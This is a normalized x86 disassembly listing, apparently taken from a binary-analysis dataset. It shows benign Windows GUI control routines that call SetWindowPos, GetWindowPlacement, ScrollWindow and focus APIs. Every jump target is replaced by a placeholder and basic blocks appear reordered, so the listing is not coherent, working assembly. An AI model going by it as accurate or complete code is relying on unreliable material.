sub eax 0x4
je r-xdata
jmp r-xdata
sub_453398
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44e340
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_464518
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44e340
test eax eax
jne r-xdata
sub_4533e4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_4531cc
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44e340
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_464518
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44e340
test eax eax
jne r-xdata
sub_453440
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_464518
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44e340
mov [ esi + 0xc ] eax
sub_453474
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_453d8c
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44c7e0
mov eax ebx
mov si 0xffd0
call sub_40338c
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_44cb2c
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45354c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_4507b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_45077c
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_40338c
inc edi
dec ebx
jne r-xdata
sub_453594
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450320
xor eax eax
push ebp
push sub_453632
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45354c
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44cda8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453639
mov eax [ ebp - 0x4 ]
call sub_450328
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_453640
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_4507b8
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_450348
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_45077c
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_453730
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_4184cc
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_418360
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_4184ec
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_418470
call sub_453a88
jmp r-xdata
mov eax ebp
mov edx esi
call sub_418470
call sub_453a88
sub_453808
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_453730
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_453868
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_453a88
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_453a88
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
test eax eax
jne r-xdata
sub_4538cc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453d8c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_44e340
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_43c850
call sub_43c930
test al al
je r-xdata
mov eax ebx
call sub_4507b8
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_45077c
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_45077c
test [ eax + 0x52 ] 0x4
je r-xdata
sub_453990
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_44cb2c
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_4539c8
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_464518
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_453a08
push ebx
mov ebx eax
mov eax ebx
call sub_464518
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_468284
pop ebx
retn
mov eax ebx
call sub_464540
mov eax ebx
call sub_453a88
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_453a40
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_453a64
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_453a64
sub_453a9c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_416e34
mov eax edi
call sub_4507b8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_45077c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_453b30
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_453a88
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_453b68
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_453d8c
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_453a88
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_40338c
sub_453c24
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_4184cc
pop esi
pop ebx
retn
sub_453c48
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_453c24
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_418360
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_4184ec
sub_453cbc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_453d8c
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_44e340
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_453d1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_453d80
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453d87
lea eax [ ebp - 0x4 ]
call sub_40578c
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_40338c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4057a4
sub_453d98
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44c7e0
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_453e50
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_418470
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_418314
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_40338c
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_453eb0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_453fa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_40338c
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453fad
mov eax [ ebp - 0x14 ]
call sub_403190
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_4184cc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418470
mov edi eax
mov eax edi
mov si 0xffb8
call sub_40338c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_453fbc
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_453eb0
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_453fe8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_464518
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_453eb0
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_453eb0
mov edx eax
mov eax esi
call sub_468184
sub_45402c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4507b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45077c
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_454074
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_453730
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44d3fc
sub_4540bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_454140
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_453d8c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_4507b8
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_454502
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_4507b8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4540bc
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_45077c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
